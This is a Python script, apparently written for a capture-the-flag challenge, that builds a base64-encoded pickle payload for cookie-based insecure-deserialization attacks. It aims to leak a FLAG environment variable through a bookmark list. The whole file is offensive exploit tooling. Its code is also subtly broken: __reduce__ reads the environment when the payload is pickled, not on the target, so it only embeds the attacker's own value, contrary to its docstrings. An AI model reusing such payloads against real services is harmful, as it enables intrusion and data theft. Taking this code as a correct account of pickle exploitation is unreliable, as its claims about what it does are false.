#!/usr/bin/env python3
"""
Sophisticated Pickle Payload Generator
Creates a pickle payload that returns a list of bookmarks structure
with environment variables embedded in the URL field when deserialized.
"""

import pickle
import base64
import os

class EnvCapture:
    """
    A pickle payload class that captures environment variables
    and embeds them in a bookmark structure
    """
    
    def __reduce__(self):
        import os
        
        # Capture environment variables
        env_vars = os.environ
        
        # Specifically look for FLAG environment variable
        flag = env_vars.get('FLAG', 'FLAG_NOT_FOUND')
        
        # Create the bookmarks structure - a list with one bookmark dict
        # Each bookmark has 'name' and 'url' keys
        bookmarks_list = [
            {
                'name': 'FLAG',
                'url': flag  # Embed the flag value in the URL field
            }
        ]
        
        # Return the list object when deserialized
        return (list, (bookmarks_list,))

def generate_sophisticated_payload():
    """Generate the sophisticated pickle payload"""
    print("=== Sophisticated Pickle Payload Generator ===")
    print("Creating payload that returns bookmark list with environment variables...")
    
    # Create instance of our payload class
    payload = EnvCapture()
    
    # Serialize using pickle.dumps
    print("\n[*] Serializing payload with pickle.dumps()...")
    pickled_data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)
    
    # Show raw pickle hex
    print(f"[*] Raw pickle (hex): {pickled_data.hex()}")
    
    # Encode with base64 for safe transmission/cookie storage
    print("\n[*] Encoding with base64...")
    base64_encoded = base64.b64encode(pickled_data)
    base64_string = base64_encoded.decode('utf-8')
    
    # Print the result
    print(f"\n[*] Base64 encoded payload:")
    print(f"{base64_string}")
    print(f"[*] Payload length: {len(base64_string)} characters")
    
    print("\n" + "="*50)
    print("FINAL BASE64 PAYLOAD:")
    print(base64_string)
    print("="*50)
    
    # Demonstrate what happens when this is deserialized
    print("\n[*] Proof of deserialization (local test):")
    deserialized = pickle.loads(base64.b64decode(base64_string))
    print(f"Deserialized type: {type(deserialized)}")
    print(f"Deserialized content: {deserialized}")
    
    return base64_string

if __name__ == "__main__":
    generate_sophisticated_payload()
